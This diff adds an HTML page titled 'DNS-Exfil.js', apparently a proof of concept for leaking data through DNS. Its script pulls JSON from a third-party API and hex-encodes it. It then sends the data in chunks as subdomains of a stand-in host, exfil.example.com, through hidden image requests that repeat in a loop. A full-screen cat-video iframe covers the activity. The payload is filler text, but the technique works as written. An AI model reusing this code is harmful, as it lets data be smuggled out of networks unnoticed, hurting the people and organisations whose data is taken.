@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html style="width:100%;height:100%;">
+  <head>
+    <title>DNS-Exfil.js</title>
+    <script>
+    var targetId = Math.round(Math.random() * 1000000);
+
+var sessionId = guid();
+
+function doRequest(){
+  var script = document.createElement('script');
+  script.src = '//baconipsum.com/api/?callback=doRun&bogus=' + targetId;
+  document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+function doRun(data) {
+
+  var hex = JSON.stringify(data).hexEncode();
+  var chunkSize = 60;
+  var chunkCount = Math.ceil(hex.length / chunkSize);
+  var counter = 0;
+  var html = '';
+
+  var timer = setInterval(function(){
+    if (counter <= chunkCount){
+      var offset = counter * chunkSize;
+      var chunk = hex.substring(offset, offset + chunkSize);
+      var url = "http://" + chunk + "." + targetId + '.' + counter + '.'+ sessionId + '.exfil.example.com/';
+      var image = document.createElement('img');
+      image.src = url;
+      image.style = "display:none;";
+      counter++;
+    } else {
+      targetId++;
+      clearInterval(timer);
+      setTimeout(doRequest, 1000);
+    }
+  }, 10);
+}
+
+window.doRun = doRun;
+
+String.prototype.hexEncode = function(){
+  var hex, i;
+  var result = "";
+  for (i=0; i<this.length; i++) {
+    result += this.charCodeAt(i).toString(16);
+  }
+
+      return result;
+};
+
+function guid() {
+  function s4() {
+      return Math.floor((1 + Math.random()) * 0x10000)
+        .toString(16)
+        .substring(1);
+    }
+  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+      s4() + '-' + s4() + s4() + s4();
+}
+
+doRequest();
+
+</script>
+  </head>
+  <body style="width:100%;height:100%">
+    <iframe style="width:100%;height:100%;" src="http://giphy.com/search/funny-cat-videos"><iframe>
+  </body>
+</html>
